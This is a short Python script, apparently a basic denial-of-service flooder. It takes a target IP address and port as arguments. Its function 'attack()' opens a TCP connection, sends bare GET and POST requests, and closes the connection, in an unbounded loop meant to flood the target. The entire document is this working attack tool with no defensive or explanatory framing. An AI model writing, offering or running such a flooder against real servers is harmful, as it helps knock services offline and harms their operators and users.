import socket, sys, os, random, string, argparse


ps = argparse.ArgumentParser()
ps.add_argument('-ip', type=str, required=True)
ps.add_argument('-p', type=int, required=True)
arg=ps.parse_args()

IP_ADDR=arg.ip
PORT=arg.p

def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP_ADDR, PORT))
    request = "GET / HTTP/1.1\r\nHost:%s\r\n\r\n" % IP_ADDR
    s.send(request.encode())
    request2 = "POST / HTTP/1.1\r\nHost:%s\r\n\r\n" % IP_ADDR
    s.send(request2.encode())
    s.close()
    
while True:  
    attack()
